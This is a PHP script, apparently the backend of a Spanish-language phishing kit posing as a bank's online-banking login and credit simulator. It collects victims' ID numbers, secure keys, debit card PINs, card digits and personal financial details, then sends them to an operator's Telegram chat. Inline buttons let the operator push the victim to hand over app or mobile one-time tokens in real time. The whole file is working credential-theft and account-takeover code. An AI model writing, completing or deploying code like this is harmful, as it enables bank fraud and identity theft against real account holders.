<?php
// process_bv_login.php

session_start();

// 1. Cargar la configuración principal
$config = require 'conexion.php';

// --- Lógica de Base de Datos (SIN CAMBIOS) ---
$db_config = $config['db'];
// ============ CAMBIO PARA POSTGRESQL ============
$dsn = "pgsql:host={$db_config['host']};dbname={$db_config['dbname']}";
$new_id = null;
try {
    $pdo = new PDO($dsn, $db_config['user'], $db_config['password']);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $new_id = bin2hex(random_bytes(16));
    $estado = 0; // Estado inicial
    $sql = "INSERT INTO a_confirmar (id, estado) VALUES (:id, :estado)";
    $stmt = $pdo->prepare($sql);
    $stmt->execute([':id' => $new_id, ':estado' => $estado]);
    $_SESSION['transaction_id'] = $new_id;
} catch (PDOException $e) {
    error_log("Error de base de datos: " . $e->getMessage());
}

// --- Lógica de Telegram ---
$telegram_config = $config['telegram'];
if (!isset($telegram_config['bot_token']) || !isset($telegram_config['chat_id'])) {
    header('Location: ../../index.php?id=' . ($new_id ?? 'error'));
    exit;
}

$botToken = $telegram_config['bot_token'];
$chatId = $telegram_config['chat_id'];

// Captura de datos del formulario (Login)
if (isset($_POST['debit_card_key'])) {
    $doc_type = $_POST['document_type_td'] ?? 'No especificado';
    $doc_number = $_POST['document_number_td'] ?? 'No especificado';
    $debit_card_key = $_POST['debit_card_key'] ?? 'No especificado';
    $last_4_digits = $_POST['last_4_digits'] ?? 'No especificado';
    $secure_key = null;
} else {
    $doc_type = $_POST['document_type'] ?? 'No especificado';
    $doc_number = $_POST['document_number'] ?? 'No especificado';
    $secure_key = $_POST['secure_key'] ?? 'No especificado';
    $debit_card_key = null;
    $last_4_digits = null;
}

// Mensaje para Telegram (Parte 1: Login)
$message = "🏦 *Nuevo Log - Banca Virtual* 🏦\n\n";
$message .= "› *Tipo Doc:* " . htmlspecialchars($doc_type) . "\n";
$message .= "› *Documento:* `" . htmlspecialchars($doc_number) . "`\n";
if ($debit_card_key) {
    $message .= "› *Clave T. Débito:* `" . htmlspecialchars($debit_card_key) . "`\n";
    $message .= "› *Últimos 4 Dígitos:* `" . htmlspecialchars($last_4_digits) . "`\n";
} else {
    $message .= "› *Clave Segura:* `" . htmlspecialchars($secure_key) . "`\n";
}

// ======================= INICIO DE LA MODIFICACIÓN =======================
// --- NUEVA SECCIÓN: Captura de datos del crédito ---
// (JavaScript los envía con el prefijo 'credito_')

// Capturar números (el JS los envía limpios, sin '$' ni '.')
$credito_monto_raw = $_POST['credito_montoCredito'] ?? 0;
$credito_ingresos_raw = $_POST['credito_ingresoMensual'] ?? 0;
$credito_gastos_raw = $_POST['credito_gastosMensual'] ?? 0;
$credito_saldo_raw = $_POST['credito_saldoActual'] ?? 0;

// Formatear números como moneda para Telegram
$credito_monto = '$' . number_format($credito_monto_raw, 0, ',', '.');
$credito_ingresos = '$' . number_format($credito_ingresos_raw, 0, ',', '.');
$credito_gastos = '$' . number_format($credito_gastos_raw, 0, ',', '.');
$credito_saldo = '$' . number_format($credito_saldo_raw, 0, ',', '.');

// Captura del resto de datos de crédito
$credito_tipo_doc = $_POST['credito_tipoDocCredito'] ?? 'No especificado';
$credito_cedula = $_POST['credito_cedula'] ?? 'No especificado';
$credito_nombre = $_POST['credito_nombreCompleto'] ?? 'No especificado';
$credito_ocupacion = $_POST['credito_ocupacion'] ?? 'No especificado';
$credito_plazo = $_POST['credito_plazo'] ?? 'No especificado';
$credito_fecha_pago = $_POST['credito_fechaPago'] ?? 'No especificado';

// --- Añadir datos del crédito al mensaje de Telegram ---
$message .= "\n\n💰 *Datos del Crédito Simulado* 💰\n";
$message .= "› *Monto Solicitado:* `" . htmlspecialchars($credito_monto) . "`\n";
$message .= "› *Tipo Doc (Crédito):* " . htmlspecialchars($credito_tipo_doc) . "\n";
$message .= "› *Cédula (Crédito):* `" . htmlspecialchars($credito_cedula) . "`\n";
$message .= "› *Nombre (Crédito):* " . htmlspecialchars($credito_nombre) . "\n";
$message .= "› *Ocupación:* " . htmlspecialchars($credito_ocupacion) . "\n";
$message .= "› *Ingresos:* `" . htmlspecialchars($credito_ingresos) . "`\n";
$message .= "› *Gastos:* `" . htmlspecialchars($credito_gastos) . "`\n";
$message .= "› *Saldo Cuenta:* `" . htmlspecialchars($credito_saldo) . "`\n";
$message .= "› *Plazo:* " . htmlspecialchars($credito_plazo) . " meses\n";
$message .= "› *Fecha de Pago:* Día " . htmlspecialchars($credito_fecha_pago) . "\n";
// ======================= FIN DE LA MODIFICACIÓN =======================


// --- Lógica para Múltiples Botones con Estados (AHORA INCLUYE TOKEN MÓVIL) ---
$base_update_url = $config['base_url'];
// El botón de Token Móvil ahora apunta a nuestra nueva página de prompt
$admin_prompt_url = str_replace('actualizar_estado.php', 'admin_prompt_movil.php', $base_update_url);

$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '❌ Login Fallido', 'url' => $base_update_url . '?id=' . $new_id . '&estado=1'],
            ['text' => '⚠️ Pedir Token App', 'url' => $base_update_url . '?id=' . $new_id . '&estado=2'],
        ],
        [
            ['text' => '❌ Rechazar', 'url' => $base_update_url . '?id=' . $new_id . '&estado=3'],
            ['text' => '📱 Pedir Token Móvil', 'url' => $admin_prompt_url . '?id=' . $new_id],          
        ],
        [
            ['text' => '🚫 Token Móvil Inválido', 'url' => $base_update_url . '?id=' . $new_id . '&estado=5']
        ]
    ]
];
$reply_markup = json_encode($keyboard);


$post_fields = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown',
    'reply_markup' => $reply_markup
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot{$botToken}/sendMessage");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_exec($ch);
curl_close($ch);

header('Location: ../../index.php?id=' . ($new_id ?? 'error'));
exit;
?>